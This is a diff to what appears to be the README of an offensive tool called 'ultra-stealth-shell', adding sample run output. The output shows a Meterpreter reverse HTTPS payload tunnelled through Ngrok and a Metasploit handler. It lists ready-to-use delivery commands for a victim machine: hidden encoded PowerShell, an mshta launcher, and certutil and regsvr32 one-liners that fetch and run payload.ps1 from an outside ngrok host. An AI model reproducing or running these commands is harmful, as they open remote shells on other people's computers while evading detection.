@@ -76,14 +76,22 @@ cd ultra-stealth-shell
 python3 ultra_stealth_shell.py
 ```
 Output
+```bash
+[+] Payload selected: windows/meterpreter/reverse_https
+[*] Starting Ngrok tunnel...
+[+] Ngrok Forwarding: 0.tcp.ngrok.io:14233
+[*] Creating stealth PowerShell payload...
+[+] Saved stealth PowerShell payload as: payload.ps1
 
 🎯 STEALTH PAYLOADS READY — DELIVER ONE OF THESE TO TARGET:
 ======================================================================
 [🔥 ENV Trick] Save and run payload_launcher.bat on victim
-[🔥 Direct PowerShell] powershell -nop -w hidden -enc ...
-[🔥 mshta (LOLBIN)] mshta.exe "javascript:..."
-[🔥 certutil] certutil -urlcache -split -f http://x.x.x.x/payload.ps1 && ...
-[🔥 regsvr32] regsvr32 /s /n /u /i:http://x.x.x.x/payload.ps1 scrobj.dll
+[🔥 Direct PowerShell] powershell -nop -w hidden -enc <base64>
+[🔥 mshta (LOLBIN)] mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('<powershell>');close()"
+[🔥 certutil] certutil -urlcache -split -f http://0.tcp.ngrok.io:8000/payload.ps1 payload.ps1 && powershell -ExecutionPolicy Bypass -File payload.ps1
+[🔥 regsvr32] regsvr32 /s /n /u /i:http://0.tcp.ngrok.io:8000/payload.ps1 scrobj.dll
 ======================================================================
-
+[+] Hosted script at: http://0.tcp.ngrok.io:8000/payload.ps1
+[*] Starting Metasploit handler...
+```
 
